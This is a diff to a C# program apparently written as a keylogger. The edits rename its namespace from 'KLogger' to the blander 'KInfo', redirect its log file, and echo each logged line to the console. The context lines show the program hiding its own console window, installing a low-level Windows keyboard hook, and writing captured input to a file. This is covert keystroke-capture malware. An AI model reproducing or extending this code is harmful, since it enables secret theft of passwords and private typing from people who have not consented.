@@ -4,9 +4,9 @@ using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
-using static KLogger.WinAPI;
+using static KInfo.WinAPI;
 
-namespace KLogger
+namespace KInfo
 {
   class Logger
   {
@@ -17,12 +17,16 @@ namespace KLogger
 
     public static void Main()
     {
-      filePath = Path.GetTempPath() + "\\info.log";
+      // filePath = Path.GetTempPath() + "\\info.log";
+      filePath = @"c:\razvoj\kinfo.log";
       logToFile(string.Format("--:: {0}  ::--", DateTime.Now));
+
+      // Console.WriteLine(filePath);
+      // Console.ReadKey();
 
       var handle = GetConsoleWindow();
       ShowWindow(handle, SW_HIDE);
-
+      
       hookID = InterceptKeys.SetHook(LowLevelKeyboardProc);
       Application.Run();
       UnhookWindowsHookEx(hookID);
@@ -54,6 +58,8 @@ namespace KLogger
       StreamWriter sw = new StreamWriter(filePath, true);
       sw.WriteLine(line);
       sw.Close();
+
+      Console.WriteLine(line);
     }
   }
 }
